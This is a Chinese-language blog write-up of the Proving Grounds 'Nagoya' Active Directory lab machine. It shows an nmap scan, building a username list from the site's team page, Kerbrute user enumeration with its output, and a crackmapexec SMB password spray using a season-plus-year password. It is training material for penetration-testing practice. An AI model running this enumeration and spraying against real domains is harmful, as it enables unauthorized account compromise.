<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="en">
  <head>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>ProvingGrounds Nagoya Writeup - Xavier&#39;s Blog</title><meta name="author" content="Xavier">
<meta name="description" content="Nagoya 这是第22台，Windows系统，难度Hard，名称 Nagoya
"><meta name="keywords" content='OSCP, PG_Practice'>
  <meta itemprop="name" content="ProvingGrounds Nagoya Writeup">
  <meta itemprop="description" content="Nagoya 这是第22台，Windows系统，难度Hard，名称 Nagoya">
  <meta itemprop="datePublished" content="2024-02-07T15:09:17+00:00">
  <meta itemprop="dateModified" content="2024-02-07T15:09:17+00:00">
  <meta itemprop="wordCount" content="4862">
  <meta itemprop="keywords" content="OSCP,PG_Practice"><meta property="og:url" content="https://www.bthoughts.top/posts/provinggrounds-nagoya/">
  <meta property="og:site_name" content="Xavier&#39;s Blog">
  <meta property="og:title" content="ProvingGrounds Nagoya Writeup">
  <meta property="og:description" content="Nagoya 这是第22台，Windows系统，难度Hard，名称 Nagoya">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-02-07T15:09:17+00:00">
    <meta property="article:modified_time" content="2024-02-07T15:09:17+00:00">
    <meta property="article:tag" content="OSCP">
    <meta property="article:tag" content="PG_Practice">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="ProvingGrounds Nagoya Writeup">
  <meta name="twitter:description" content="Nagoya 这是第22台，Windows系统，难度Hard，名称 Nagoya">
<meta name="application-name" content="Xavier&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Xavier&#39;s Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="https://www.bthoughts.top/posts/provinggrounds-nagoya/" title="ProvingGrounds Nagoya Writeup - Xavier&#39;s Blog" /><link rel="prev" type="text/html" href="https://www.bthoughts.top/posts/provinggrounds-heist/" title="ProvingGrounds Heist Writeup" /><link rel="next" type="text/html" href="https://www.bthoughts.top/posts/provinggrounds-vault/" title="ProvingGrounds Vault Writeup" /><link rel="alternate" type="text/markdown" href="https://www.bthoughts.top/posts/provinggrounds-nagoya/index.md" title="ProvingGrounds Nagoya Writeup - Xavier's Blog"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "ProvingGrounds Nagoya Writeup",
    "inLanguage": "en",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "https:\/\/www.bthoughts.top\/posts\/provinggrounds-nagoya\/"
    },"genre": "posts","keywords": "OSCP, PG_Practice","wordcount":  4862 ,
    "url": "https:\/\/www.bthoughts.top\/posts\/provinggrounds-nagoya\/","datePublished": "2024-02-07T15:09:17+00:00","dateModified": "2024-02-07T15:09:17+00:00","publisher": {
      "@type": "Organization",
      "name": ""},"author": {
        "@type": "Person",
        "name": "Xavier"
      },"description": ""
  }
  </script><script src="/js/head/color-scheme.min.js"></script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
              <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
              <a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item">
              <a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item">
              <a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
            </a>
            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
            </a>
            <span class="search-button search-loading" id="search-loading-desktop">
              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
            </span>
          </li><li class="menu-item theme-switch" title="切换主题">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
            <div class="search mobile" id="search-mobile">
              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
              </a>
              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
              </a>
              <span class="search-button search-loading" id="search-loading-mobile">
                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
              </span>
            </div>
            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
              取消
            </a>
          </li><li class="menu-item"><a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item"><a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
      </ul>
    </nav>
  </div>
</header><div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
  </div>
  <div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
  </div><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>ProvingGrounds Nagoya Writeup</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/resource/friends/me.png" alt="Xavier" data-title="Xavier" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Xavier</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/%E9%9D%B6%E5%9C%BA/" class="post-category" title="分类 - 靶场"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 靶场</a></span></div><div class="post-meta-line"><span title="发布于 2024-02-07 15:09:17"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-02-07">2024-02-07</time></span>&nbsp;<span title="4862 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 4900 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 10 分钟</span>&nbsp;<span id="busuanzi_container_page_pv" class="busuanzi_visitors comment-visitors" data-flag-title="ProvingGrounds Nagoya Writeup"><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_page_pv">-</span>&nbsp;次阅读
          </span>&nbsp;</div>
    </div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>目录</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#nagoya">Nagoya</a></li>
    <li><a href="#portscan">PortScan</a></li>
    <li><a href="#initaccess">InitAccess</a>
      <ul>
        <li><a href="#80-web">80-Web</a></li>
        <li><a href="#hint-1">Hint-1</a></li>
        <li><a href="#smb-445">SMB-445</a></li>
        <li><a href="#hint-2">Hint-2</a></li>
        <li><a href="#kerberoasting">Kerberoasting</a></li>
        <li><a href="#rpc">RPC</a></li>
      </ul>
    </li>
    <li><a href="#prive">PrivE</a>
      <ul>
        <li><a href="#mssql">MSSQL</a></li>
        <li><a href="#hint-3">Hint-3</a></li>
        <li><a href="#白银票据">白银票据</a></li>
      </ul>
    </li>
    <li><a href="#flag">Flag</a></li>
  </ul>
</nav></div>
      </div><div class="content" id="content" data-end-flag="It&#39;s end."><h2 id="nagoya" class="heading-element"><span>Nagoya</span>
  <a href="#nagoya" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>这是第22台，Windows系统，难度Hard，名称 Nagoya</p>
<p>192.168.166.21</p>
<h2 id="portscan" class="heading-element"><span>PortScan</span>
  <a href="#portscan" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ sudo nmap -n -r --min-rate<span class="o">=</span><span class="m">3500</span> -sSV 192.168.166.21 -T4
</span></span><span class="line"><span class="cl">Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-02-07 15:09 CST
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 192.168.166.21
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.25s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">987</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE           VERSION
</span></span><span class="line"><span class="cl">53/tcp   open  domain            Simple DNS Plus
</span></span><span class="line"><span class="cl">80/tcp   open  http              Microsoft IIS httpd 10.0
</span></span><span class="line"><span class="cl">88/tcp   open  kerberos-sec      Microsoft Windows Kerberos <span class="o">(</span>server time: 2024-02-07 07:09:23Z<span class="o">)</span>
</span></span><span class="line"><span class="cl">135/tcp  open  msrpc             Microsoft Windows RPC
</span></span><span class="line"><span class="cl">139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
</span></span><span class="line"><span class="cl">389/tcp  open  ldap              Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: nagoya-industries.com0., Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds?
</span></span><span class="line"><span class="cl">464/tcp  open  kpasswd5?
</span></span><span class="line"><span class="cl">593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
</span></span><span class="line"><span class="cl">636/tcp  open  ldapssl?
</span></span><span class="line"><span class="cl">3268/tcp open  ldap              Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: nagoya-industries.com0., Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl">3269/tcp open  globalcatLDAPssl?
</span></span><span class="line"><span class="cl">3389/tcp open  ms-wbt-server     Microsoft Terminal Services
</span></span><span class="line"><span class="cl">Service Info: Host: NAGOYA<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 32.86 seconds</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="initaccess" class="heading-element"><span>InitAccess</span>
  <a href="#initaccess" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><h3 id="80-web" class="heading-element"><span>80-Web</span>
  <a href="#80-web" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>发现80的Web服务重有个Team页面，包含了团队成员</p>
<p><a class="lightgallery" href="/posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207153552043.png?size=large" data-thumbnail="/posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207153552043.png?size=small" data-sub-html="<h2>image-20240207153552043</h2>"><img loading="lazy" src="/posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207153552043.png" alt="image-20240207153552043" srcset="/posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207153552043.png?size=small, /posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207153552043.png?size=medium 1.5x, /posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207153552043.png?size=large 2x" data-title="image-20240207153552043" style="--width: 1217px;--aspect-ratio: 1217 / 822;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>根据这个页面制作字典，我最初设计的字典格式是：<code>Emma 	Miah</code>，  <code>Emma.Miah</code>， <code>EmmaMiah</code> 三种格式</p>
<p>使用Kerbrute验证有效的域用户：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Nagoya<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ kerbrute -domain nagoya-industries.com -users ./teams.txt -dc-ip 192.168.166.21
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Impacket v0.10.0 - Copyright <span class="m">2022</span> SecureAuth Corporation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Valid <span class="nv">user</span> <span class="o">=</span>&gt; Matthew.Harrison
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Valid <span class="nv">user</span> <span class="o">=</span>&gt; Emma.Miah
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Valid <span class="nv">user</span> <span class="o">=</span>&gt; Rebecca.Bell
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Valid <span class="nv">user</span> <span class="o">=</span>&gt; Scott.Gardner
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Valid <span class="nv">user</span> <span class="o">=</span>&gt; Terry.Edwards
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Valid <span class="nv">user</span> <span class="o">=</span>&gt; Holly.Matthews
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Valid <span class="nv">user</span> <span class="o">=</span>&gt; Anne.Jenkins
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Valid <span class="nv">user</span> <span class="o">=</span>&gt; Brett.Naylor
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Valid <span class="nv">user</span> <span class="o">=</span>&gt; Melissa.Mitchell
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Valid <span class="nv">user</span> <span class="o">=</span>&gt; Craig.Carr
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Valid <span class="nv">user</span> <span class="o">=</span>&gt; Fiona.Clark
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Valid <span class="nv">user</span> <span class="o">=</span>&gt; Patrick.Martin
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Valid <span class="nv">user</span> <span class="o">=</span>&gt; Kate.Watson
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Valid <span class="nv">user</span> <span class="o">=</span>&gt; Kirsty.Norris
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Valid <span class="nv">user</span> <span class="o">=</span>&gt; Andrea.Hayes
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Valid <span class="nv">user</span> <span class="o">=</span>&gt; Abigail.Hughes
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Valid <span class="nv">user</span> <span class="o">=</span>&gt; Melanie.Watson
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Valid <span class="nv">user</span> <span class="o">=</span>&gt; Frances.Ward
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Valid <span class="nv">user</span> <span class="o">=</span>&gt; Sylvia.King
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Valid <span class="nv">user</span> <span class="o">=</span>&gt; Wayne.Hartley
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Valid <span class="nv">user</span> <span class="o">=</span>&gt; Iain.White
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Valid <span class="nv">user</span> <span class="o">=</span>&gt; Joanna.Wood
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Valid <span class="nv">user</span> <span class="o">=</span>&gt; Bethan.Webster
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Valid <span class="nv">user</span> <span class="o">=</span>&gt; Elaine.Brady
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Valid <span class="nv">user</span> <span class="o">=</span>&gt; Christopher.Lewis
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Valid <span class="nv">user</span> <span class="o">=</span>&gt; Megan.Johnson
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Valid <span class="nv">user</span> <span class="o">=</span>&gt; Damien.Chapman
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Valid <span class="nv">user</span> <span class="o">=</span>&gt; Joanne.Lewis
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> No passwords were discovered :<span class="err">&#39;</span><span class="o">(</span></span></span></code></pre></td></tr></table>
</div>
</div><h3 id="hint-1" class="heading-element"><span>Hint-1</span>
  <a href="#hint-1" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><blockquote>
<p><strong>Foothold 1</strong></p>
<p>Build a username wordlist with the names found in the web app, you can try conventions like Offsec.Labs . Spraying easy password combinations like seasons + years is always a good start.</p>
</blockquote>
<h3 id="smb-445" class="heading-element"><span>SMB-445</span>
  <a href="#smb-445" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>根据提示，构建密码字典，如：Spring2023、Summer2023、Autumn2023、Winter2023等。</p>
<p>这里不看提示真的很难。</p>
<p>SMB枚举：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Nagoya<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ crackmapexec smb 192.168.166.21 -u ./users.txt -p <span class="s1">&#39;Summer2023&#39;</span> --shares 
